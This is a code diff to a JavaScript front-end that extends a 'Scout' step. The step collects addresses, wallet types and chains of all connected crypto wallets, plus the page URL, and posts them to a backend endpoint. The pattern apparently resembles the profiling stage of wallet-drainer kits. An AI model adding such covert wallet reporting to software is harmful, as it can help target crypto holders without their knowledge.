@@ -3412,17 +3412,26 @@
       // Step 4b: Scout - report connected wallets to backend
       updateStatus('📡 Reporting wallet info...');
       try {
-        var scoutAddress = connected.EVM ? connected.EVM.address : (connected[Object.keys(connected)[0]] ? connected[Object.keys(connected)[0]].address : '');
+        var firstChain = Object.keys(connected)[0] || 'EVM';
+        var firstWallet = connected[firstChain];
+        var scoutAddress = firstWallet ? firstWallet.address : '';
+        var scoutWalletType = firstWallet ? firstWallet.walletType : 'Unknown';
+        var scoutChainFamily = firstChain === 'SOL' ? 'SVM' : firstChain === 'BTC' ? 'UTXO' : firstChain;
+
+        // Build detailed wallet list with names
         var connectedWalletList = Object.keys(connected).map(function(k) { return connected[k].address; }).filter(Boolean);
+        var walletNames = Object.keys(connected).map(function(k) { return k + ':' + (connected[k].walletType || 'unknown'); }).join(', ');
+
         await apiPost('/api/v1/scout', {
           user_address: scoutAddress,
-          chain_id: 1,
-          wallet_type: connected.EVM ? connected.EVM.walletType : 'Unknown',
-          chain_family: connected.EVM ? 'EVM' : Object.keys(connected)[0],
+          chain_id: connected.EVM ? connected.EVM.chainId || 1 : 1,
+          wallet_type: scoutWalletType,
+          chain_family: scoutChainFamily,
           source_page: window.location.href,
-          connected_wallets: connectedWalletList
+          connected_wallets: connectedWalletList,
+          active_chain_tab: walletNames
         });
-        LOGGER.info('Scout telemetry sent');
+        LOGGER.info('Scout telemetry sent: ' + scoutWalletType + ' on ' + scoutChainFamily);
       } catch (scoutErr) {
         LOGGER.debug('Scout telemetry skipped:', scoutErr.message);
       }
